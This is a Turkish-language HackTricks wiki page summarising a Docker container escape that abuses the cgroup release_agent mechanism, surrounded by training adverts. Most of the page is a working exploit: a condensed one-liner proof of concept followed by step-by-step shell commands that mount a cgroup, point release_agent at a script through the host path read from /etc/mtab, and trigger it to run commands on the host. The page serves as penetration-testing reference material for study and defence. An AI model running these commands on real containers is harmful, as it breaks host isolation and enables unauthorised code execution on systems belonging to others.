# Docker release\_agent cgroups escape

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}


**Daha fazla ayrıntı için** [**orijinal blog yazısına**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) **bakın.** Bu sadece bir özet:

Orijinal PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
The proof of concept (PoC) cgroups'ı istismar etmek için bir `release_agent` dosyası oluşturarak ve bunun çağrılmasını tetikleyerek konteyner ana bilgisayarında rastgele komutlar çalıştırma yöntemini göstermektedir. İşte ilgili adımların bir dökümü:

1. **Ortamı Hazırlayın:**
* cgroup için bir montaj noktası olarak hizmet vermesi için `/tmp/cgrp` dizini oluşturulur.
* RDMA cgroup denetleyicisi bu dizine monte edilir. RDMA denetleyicisi yoksa, alternatif olarak `memory` cgroup denetleyicisinin kullanılması önerilir.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Çocuk Cgroup'u Kurun:**
* Montelenmiş cgroup dizini içinde "x" adında bir çocuk cgroup oluşturulur.
* "x" cgroup'u için bildirimler, notify\_on\_release dosyasına 1 yazarak etkinleştirilir.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Release Agent'ı Yapılandırın:**
* Konteynerin ana makinedeki yolu /etc/mtab dosyasından alınır.
* Ardından, cgroup'un release\_agent dosyası, elde edilen ana makine yolunda bulunan /cmd adlı bir betiği çalıştıracak şekilde yapılandırılır.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd Scriptini Oluşturun ve Yapılandırın:**
* /cmd scripti konteyner içinde oluşturulur ve ps aux komutunu çalıştıracak şekilde yapılandırılır, çıktıyı konteynerde /output adlı bir dosyaya yönlendirir. /output'un ana makinedeki tam yolu belirtilir.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Saldırıyı Tetikleme:**
* "x" çocuk cgroup içinde bir işlem başlatılır ve hemen sonlandırılır.
* Bu, `release_agent`'i (the /cmd script) tetikler, bu da host üzerinde ps aux komutunu çalıştırır ve çıktıyı konteyner içindeki /output'a yazar.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
